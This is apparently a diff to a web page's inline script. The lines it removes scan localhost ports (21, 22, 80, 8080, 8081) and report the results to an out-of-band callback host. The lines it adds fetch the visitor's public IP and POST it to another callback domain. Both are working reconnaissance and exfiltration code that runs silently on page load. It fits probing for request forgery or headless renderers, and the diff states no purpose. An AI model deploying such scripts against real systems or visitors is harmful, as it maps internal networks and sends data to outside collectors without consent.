@@ -5,37 +5,47 @@
   <div id="result1"></div>
   
   <script>
-   /* fetch("https://google.com/", {
-      mode: "no-cors"
-    })
-    .then(r => {
-      fetch(`https://d9snkcimruoij3kjgbog76tytcn3omxq1.oast.live/?q=${navigator.appVersion}`, {
+     fetch("https://jsonip.com")
+    .then(async r => {
+      const body = await r.text();
+  
+      const data = {
+        type: "success",
+        status: r.status,
+        responseType: r.type,
+        body: body
+      };
+  
+      document.getElementById("result1").textContent =
+        JSON.stringify(data, null, 2);
+  
+      fetch("https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({
-          type: "success",
-          status: r.status,
-          type: r.type
-        })
+        body: JSON.stringify(data)
       });
     })
     .catch(err => {
-      fetch(`https://d9snkcimruoij3kjgbog76tytcn3omxq1.oast.live/?q=${navigator.appVersion}`, {
+      const data = {
+        type: "error",
+        error: String(err),
+        message: err?.message || null
+      };
+  
+      document.getElementById("result1").textContent =
+        JSON.stringify(data, null, 2);
+  
+      fetch("https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({
-          type: "error",
-          error: String(err)
-        })
+        body: JSON.stringify(data)
       });
-    });*/
-    for(i=0;i<l.length;i++)
-    {n=l[i];x=new XMLHttpRequest();x.onreadystatechange=function(){if(this.readyState==4){fetch(`https://d9snkcimruoij3kjgbog76tytcn3omxq1.oast.live/?q=${this.status}`)}};x.open("GET","http://127.0.0.1:"+n+"/",true);x.send();}l=[21,22,80,8080,8081];
-    
+    });
+   
   </script>
 
     
